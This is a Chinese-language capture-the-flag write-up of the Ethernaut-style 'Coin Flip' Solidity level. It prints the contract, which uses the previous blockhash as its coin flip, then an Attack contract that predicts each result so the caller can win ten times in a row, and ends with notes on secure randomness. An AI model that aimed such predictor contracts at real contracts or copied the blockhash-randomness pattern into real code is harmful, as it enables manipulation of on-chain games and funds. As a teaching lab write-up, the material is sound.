# 3.Coin Flip

## 题目描述

![img](../../../.vuepress/public/img/1645011948059-f3f2ea31-ba84-45db-b702-a7d7b2e428b1.png)

## 解题过程

题目源码

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

这里通过计算上一区块的信息与一个固定的数值相计算，就不存在随机的情况了，除了第一次的上一区块随机，其他均为可知的值

![img](../../../.vuepress/public/img/1645054208418-cc8c6e81-78ce-4c64-846c-099cbc532ac2.png)

直接使用原合约的计算方法，部署攻击合约

```javascript
contract Attack {
  using SafeMath for uint256;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  address addr = 0x36D583674B7afE99c0c8FDE510BbA46ec7b96531;
  CoinFlip coin = CoinFlip(addr);

  function attack() public{
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;
    coin.flip(side);
  }
}
```

调用10次完成关卡

![img](../../../.vuepress/public/img/1645054867204-01557284-20da-4ba5-b878-41839a6cd94c.png)

```javascript
通过solidity产生随机数没有那么容易. 目前没有一个很自然的方法来做到这一点, 而且你在智能合约中做的所有事情都是公开可见的, 包括本地变量和被标记为私有的状态变量. 矿工可以控制 blockhashes, 时间戳, 或是是否包括某个交易, 这可以让他们根据他们目的来左右这些事情.
想要获得密码学上的随机数,你可以使用 Chainlink VRF, 它使用预言机, LINK token, 和一个链上合约来检验这是不是真的是一个随机数.
一些其它的选项包括使用比特币block headers (通过验证 BTC Relay), RANDAO, 或是 Oraclize).
```